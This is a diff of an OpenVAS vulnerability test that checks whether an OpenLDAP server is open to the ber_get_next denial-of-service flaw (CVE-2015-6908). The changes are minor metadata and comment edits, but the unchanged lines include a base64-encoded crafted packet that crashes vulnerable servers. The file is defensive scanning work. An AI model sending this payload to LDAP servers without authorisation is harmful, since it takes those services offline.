@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_openldap_ber_get_next_dos_vuln.nasl 5184 2017-02-03 08:18:36Z cfi $
+# $Id: gb_openldap_ber_get_next_dos_vuln.nasl 11982 2018-10-19 08:49:21Z mmartin $
 #
 # OpenLDAP 'ber_get_next' Denial of Service Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.809787");
-  script_version("$Revision: 5184 $");
+  script_version("$Revision: 11982 $");
   script_cve_id("CVE-2015-6908");
   script_bugtraq_id(76714);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-03 09:18:36 +0100 (Fri, 03 Feb 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-19 10:49:21 +0200 (Fri, 19 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-01-25 16:44:08 +0530 (Wed, 25 Jan 2017)");
   script_name("OpenLDAP ber_get_next Denial of Service Vulnerability");
   script_category(ACT_DENIAL);
@@ -46,7 +46,7 @@ if(description)
   script_xref(name:"URL", value:"http://www.openldap.org/software/release/changes.html");
   script_xref(name:"URL", value:"http://www.security-assessment.com/files/documents/advisory/OpenLDAP-ber_get_next-Denial-of-Service.pdf");
 
-  script_tag(name:"summary", value:"The host is running OpenLDAP and is 
+  script_tag(name:"summary", value:"The host is running OpenLDAP and is
   prone to denial of service vulnerability.");
 
   script_tag(name:"vuldetect", value:"Send a crafted request and check
@@ -58,14 +58,11 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation may allow remote
   attackers to cause the application to crash, creating a denial-of-service
-  condition.
-
-  Impact Level: Application");
+  condition.");
 
   script_tag(name:"affected", value:"OpenLDAP versions 2.4.42 and prior.");
 
-  script_tag(name:"solution", value:"Upgrade to OpenLDAP version 2.4.43 or later.
-  For updates refer to http://www.openldap.org");
+  script_tag(name:"solution", value:"Upgrade to OpenLDAP version 2.4.43 or later.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -94,14 +91,11 @@ ldapres = hexstr( buf );
 
 if( ldapres =~ "^30$" ) {
 
-  ## Try exploit
   exploit = base64decode( str:"/4SEhISEd4MKYj5ZMgAAAC8=" );
   send( socket:soc, data:exploit );
 
-  ## Wait for sometime
   sleep( 5 );
 
-  ## check if exploit is successful or not
   if( ! ldap_alive( port:port ) ) {
     security_message( port:port );
     close( soc );
